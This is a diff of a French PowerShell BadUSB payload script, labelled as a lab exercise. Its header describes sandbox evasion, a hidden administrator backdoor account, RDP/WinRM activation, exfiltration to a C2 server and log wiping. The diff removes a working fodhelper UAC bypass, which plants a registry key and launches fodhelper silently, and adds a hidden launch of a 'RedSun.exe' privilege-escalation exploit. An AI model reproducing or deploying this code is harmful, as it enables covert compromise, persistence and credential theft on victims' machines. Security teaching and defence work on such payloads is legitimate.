@@ -1,14 +1,20 @@
 # ==============================================================
-# payload.ps1 – Charge utile BadUSB (Partie 1 – Version claire)
+# payload.ps1 – Charge utile BadUSB (Partie 1) avec RedSun LPE
 # Objectif pédagogique : TP sécurité offensive / défensive
 #
 # Scénario :
 #   1. Anti-analyse  : détection sandbox/VM + outils de débogage
-#   2. Élévation     : contournement UAC (fodhelper bypass)
+#   2. Élévation     : RedSun (Local Privilege Escalation via Defender)
 #   3. Backdoor      : création d'un compte administrateur caché
 #   4. Accès distant : activation RDP + WinRM + règles pare-feu
-#   5. Exfiltration  : envoi des accès au serveur C2 via HTTPS
+#   5. Exfiltration  : envoi des accès au serveur C2
 #   6. Couverture    : nettoyage des journaux et de l'historique
+#
+# Prérequis USB :
+#   - payload.ps1  (ce fichier)
+#   - RedSun.exe   (LPE exploit – doit être à la racine de la clé)
+#   - launcher.vbs
+#   - autorun.inf
 # ==============================================================
 
 $ErrorActionPreference = "SilentlyContinue"
@@ -78,7 +84,9 @@ if (Test-Sandbox) { exit }
 Start-Sleep -Milliseconds 800
 
 # ──────────────────────────────────────────────────────────────
-# 2. VÉRIFICATION ET ÉLÉVATION DES PRIVILÈGES (CONTOURNEMENT UAC)
+# 2. ÉLÉVATION DE PRIVILÈGES AVEC RedSun (LPE via Defender)
+#    Référence : CVE exploitée par RedSun (Local Privilege Escalation)
+#    RedSun.exe doit être présent à la racine de la clé USB.
 # ──────────────────────────────────────────────────────────────
 
 function Test-Admin {
@@ -87,37 +95,13 @@ function Test-Admin {
     return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 
-function Invoke-FodhelperBypass {
-    <#
-    .SYNOPSIS
-        Contournement UAC via fodhelper.exe (bypass sans prompt).
-        Fonctionnel sur Windows 10/11 sans patch spécifique.
-        Référence : MITRE ATT&CK T1548.002
-    #>
-    param([string]$Command)
-
-    $regPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
-
-    # Crée la clé de registre qui sera invoquée par fodhelper
-    $null = New-Item         -Path $regPath -Force
-    $null = New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force
-    $null = Set-ItemProperty -Path $regPath -Name "(default)" -Value $Command -Force
-
-    # Déclenche fodhelper (processus auto-élevé de Windows 10/11)
-    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
-    Start-Sleep -Seconds 3
-
-    # Nettoyage immédiat de la clé temporaire
-    $null = Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
-}
-
-# Si le script ne tourne pas encore en tant qu'admin, on s'élève
 if (-not (Test-Admin)) {
-    # Re-lance ce même script avec élévation silencieuse via fodhelper
-    $selfPath = $MyInvocation.MyCommand.Path
-    $elevCmd  = "powershell.exe -WindowStyle Hidden -NonInteractive " +
-                "-ExecutionPolicy Bypass -NoProfile -File `"$selfPath`""
-    Invoke-FodhelperBypass -Command $elevCmd
+    # Lance RedSun pour obtenir une élévation SYSTEM depuis un compte standard
+    $redsunPath = Join-Path $PSScriptRoot "RedSun.exe"
+    if (Test-Path $redsunPath) {
+        Start-Process -FilePath $redsunPath -WindowStyle Hidden
+        Start-Sleep -Seconds 5
+    }
     exit
 }
 
